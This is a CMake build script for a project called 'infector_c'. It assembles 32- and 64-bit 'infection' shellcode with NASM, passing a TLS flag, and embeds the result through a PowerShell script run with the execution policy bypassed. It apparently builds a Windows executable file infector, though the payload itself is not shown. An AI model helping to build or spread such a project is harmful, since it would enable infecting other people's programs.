cmake_minimum_required(VERSION 3.15)

project(infector_c CXX ASM_NASM)
add_executable(infector_c main.cpp)

add_custom_command(TARGET infector_c
  PRE_BUILD
  COMMAND ${CMAKE_ASM_NASM_COMPILER} ARGS
  -f bin
  -o "${CMAKE_CURRENT_BINARY_DIR}/$<CONFIG>/infection32.bin"
  -D TLS
  "../../infection/asm/32/main.asm")
add_custom_command(TARGET infector_c
  PRE_BUILD
  COMMAND ${CMAKE_ASM_NASM_COMPILER} ARGS
  -f bin
  -o "${CMAKE_CURRENT_BINARY_DIR}/$<CONFIG>/infection64.bin"
  -D TLS
  "../../infection/asm/64/main.asm")
add_custom_command(TARGET infector_c
  PRE_BUILD
  COMMAND powershell ARGS
  -ExecutionPolicy bypass
  -File "${CMAKE_CURRENT_SOURCE_DIR}/headers.ps1"
  -infection32 "${CMAKE_CURRENT_BINARY_DIR}/$<CONFIG>/infection32.bin"
  -infection64 "${CMAKE_CURRENT_BINARY_DIR}/$<CONFIG>/infection64.bin"
  -output "${CMAKE_CURRENT_BINARY_DIR}/$<CONFIG>/infections.h")

target_include_directories(infector_c PUBLIC
  "${CMAKE_CURRENT_BINARY_DIR}/$<CONFIG>")
